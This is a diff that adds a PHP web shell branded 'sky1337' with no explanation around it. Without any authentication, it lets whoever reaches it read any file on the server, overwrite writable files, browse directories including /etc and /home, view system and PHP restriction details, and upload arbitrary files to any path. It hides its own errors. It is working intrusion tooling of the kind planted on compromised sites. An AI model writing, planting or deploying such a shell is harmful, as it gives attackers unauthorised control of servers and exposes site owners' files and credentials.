@@ -1,0 +1,241 @@
+<?php
+
+error_reporting(0);@ini_set('display_errors',0);
+
+$m=isset($_GET['m'])?$_GET['m']:'upload_form';
+
+// View File (PHP native)
+
+if($m=='view'||isset($_GET['f'])){
+
+    $f=isset($_GET['f'])?$_GET['f']:'';
+
+    if($f&&file_exists($f)){
+
+        echo "<html><head><style>body{background:#0a0a0a;color:#0f0;font-family:monospace;padding:20px;}pre{background:#111;padding:15px;border-radius:6px;border:1px solid #333;white-space:pre-wrap;word-wrap:break-word;}a{color:#f44;}</style></head><body>";
+
+        echo "<h2 style='color:#f44;'>sky1337 - ".basename($f)."</h2>";
+
+        echo "<pre>".htmlspecialchars(file_get_contents($f))."</pre>";
+
+        echo "<hr><a href='?m=ls&d=".dirname($f)."'>[Back]</a></body></html>";
+
+    }else{echo "File not found";}
+
+    exit;
+
+}
+
+
+
+// Edit File
+
+if($m=='edit'&&$_SERVER['REQUEST_METHOD']=='POST'){
+
+    $f=$_POST['f'];
+
+    $c=$_POST['c'];
+
+    if($f&&file_exists($f)&&is_writable($f)){
+
+        file_put_contents($f,$c);
+
+        echo "<script>alert('Saved!');location='?m=view&f=$f';</script>";
+
+    }else{echo "Failed to save";}
+
+    exit;
+
+}
+
+
+
+// File Manager
+
+if($m=='ls'){
+
+    $d=isset($_GET['d'])?$_GET['d']:'.';
+
+    $real=realpath($d);
+
+    echo "<html><head><meta charset='UTF-8'><title>sky1337</title>
+
+    <style>body{background:#0a0a0a;color:#b0b0b0;font-family:monospace;padding:20px;}
+
+    a{color:#f44;text-decoration:none;}a:hover{color:#fff;}
+
+    .dir{color:#fa0;}.file{color:#888;}.w{color:#0f0;}
+
+    .nav{background:#111;padding:10px;border-radius:6px;margin:10px 0;border:1px solid #333;}
+
+    hr{border-color:#333;}
+
+    .s{font-size:11px;color:#666;}</style></head><body>";
+
+    echo "<h2 style='color:#f44;margin:0;'>sky1337</h2>";
+
+    echo "<p style='color:#666;font-size:11px;'>".$_SERVER['HTTP_HOST']." | ".get_current_user()."</p>";
+
+    echo "<p style='color:#fa0;'>$real</p>";
+
+    echo "<div class='nav'>";
+
+    if($d!='/'){$p=dirname($d);echo "<a href='?m=ls&d=$p'>[UP]</a> ";}
+
+    echo "<a href='?m=ls&d=.'>[HOME]</a> ";
+
+    echo "<a href='?m=ls&d=/'>[/ROOT]</a> ";
+
+    echo "<a href='?m=ls&d=/home'>[/home]</a> ";
+
+    echo "<a href='?m=ls&d=/var/www'>[/var/www]</a> ";
+
+    echo "<a href='?m=ls&d=/etc'>[/etc]</a> ";
+
+    echo "</div><hr>";
+
+    foreach(scandir($d) as $f){
+
+        if($f=='.')continue;
+
+        $path=rtrim($d,'/').'/'.ltrim($f,'/');
+
+        $w=is_writable($path)?' <span class="w">[W]</span>':'';
+
+        if(is_dir($path)){
+
+            echo "<span class='dir'>DIR</span> <a class='dir' href='?m=ls&d=$path'>$f</a>$w<br>";
+
+        }else{
+
+            $s=filesize($path);
+
+            $sh=$s>1048576?round($s/1048576,1).'MB':($s>1024?round($s/1024,1).'KB':$s.'B');
+
+            echo "<span class='file'>FILE</span> <a href='?m=view&f=$path'>$f</a> <span class='s'>$sh</span>$w<br>";
+
+        }
+
+    }
+
+    echo "<hr><div class='nav'><a href='?m=upload_form'>[Upload]</a> | <a href='?m=info'>[Info]</a></div>";
+
+    echo "</body></html>";
+
+    exit;
+
+}
+
+
+
+// Info
+
+if($m=='info'){
+
+    echo "<html><head><style>body{background:#0a0a0a;color:#b0b0b0;font-family:monospace;padding:20px;}pre{background:#111;padding:15px;border-radius:6px;border:1px solid #333;}a{color:#f44;}</style></head><body>";
+
+    echo "<h2 style='color:#f44;'>sky1337 Info</h2><pre>";
+
+    echo "Uname: ".php_uname()."\n";
+
+    echo "User: ".get_current_user()."\n";
+
+    echo "DocRoot: ".$_SERVER['DOCUMENT_ROOT']."\n";
+
+    echo "Disable: ".ini_get('disable_functions')."\n";
+
+    echo "OpenBaseDir: ".ini_get('open_basedir')."\n";
+
+    echo "Server: ".$_SERVER['SERVER_SOFTWARE']."\n";
+
+    echo "</pre><a href='?m=ls'>[Files]</a> | <a href='?m=upload_form'>[Upload]</a></body></html>";
+
+    exit;
+
+}
+
+
+
+// Upload Form
+
+if($m=='upload_form'){
+
+    $doc=$_SERVER['DOCUMENT_ROOT']??'/var/www/html';
+
+    if(!empty($_GET['path'])&&is_dir($_GET['path'])){$doc=$_GET['path'];}
+
+    echo "<html><head><meta charset='UTF-8'><title>sky1337 Upload</title>
+
+    <style>body{background:#0a0a0a;color:#b0b0b0;font-family:monospace;padding:20px;}
+
+    form{background:#111;padding:20px;border-radius:8px;max-width:500px;border:1px solid #333;}
+
+    input,button{background:#0a0a0a;color:#e0e0e0;border:1px solid #333;padding:10px;border-radius:4px;margin:5px 0;width:100%;}
+
+    button{background:#f44;color:#fff;cursor:pointer;width:auto;font-weight:bold;}button:hover{background:#c00;}
+
+    a{color:#f44;}.info{background:#1a1a1a;padding:10px;border-radius:4px;margin:10px 0;border:1px solid #333;}</style></head><body>
+
+    <h2 style='color:#f44;'>sky1337 Upload</h2>
+
+    <p><a href='?m=ls'>[Files]</a> | <a href='?m=info'>[Info]</a></p>
+
+    <div class='info'>DocRoot: $doc | Writable: ".(is_writable($doc)?'<span style="color:#0f0;">YES</span>':'<span style="color:#f00;">NO</span>')."</div>
+
+    <form method='POST' enctype='multipart/form-data' action='?m=upload'>
+
+    <input type='file' name='file' required><br>
+
+    <input type='text' name='path' value='$doc'><br>
+
+    <button type='submit'>UPLOAD</button></form></body></html>";
+
+    exit;
+
+}
+
+
+
+// Upload Process
+
+if($m=='upload'&&$_SERVER['REQUEST_METHOD']=='POST'){
+
+    $dest=$_POST['path']??$_SERVER['DOCUMENT_ROOT'];
+
+    $fn=basename($_FILES['file']['name']);
+
+    $dp=rtrim($dest,'/').'/'.$fn;
+
+    echo "<html><head><style>body{background:#0a0a0a;color:#b0b0b0;font-family:monospace;padding:20px;}a{color:#f44;}</style></head><body>";
+
+    if(move_uploaded_file($_FILES['file']['tmp_name'],$dp)){
+
+        echo "<h2 style='color:#0f0;'>SUCCESS</h2><p>$dp</p>";
+
+    }else{
+
+        echo "<h2 style='color:#f00;'>FAILED</h2>";
+
+    }
+
+    echo "<br><a href='?m=upload_form'>Back</a></body></html>";
+
+    exit;
+
+}
+
+
+
+// Home
+
+echo "<html><head><style>body{background:#0a0a0a;color:#b0b0b0;font-family:monospace;padding:40px;text-align:center;}a{color:#f44;font-size:16px;text-decoration:none;margin:10px;display:inline-block;padding:10px 20px;background:#111;border-radius:6px;border:1px solid #333;}a:hover{background:#222;color:#fff;}</style></head><body>";
+
+echo "<h1 style='color:#f44;'>sky1337</h1>";
+
+echo "<p>".$_SERVER['HTTP_HOST']." | ".get_current_user()."</p>";
+
+echo "<a href='?m=ls'>Files</a> <a href='?m=info'>Info</a> <a href='?m=upload_form'>Upload</a>";
+
+echo "</body></html>";
+
+?>
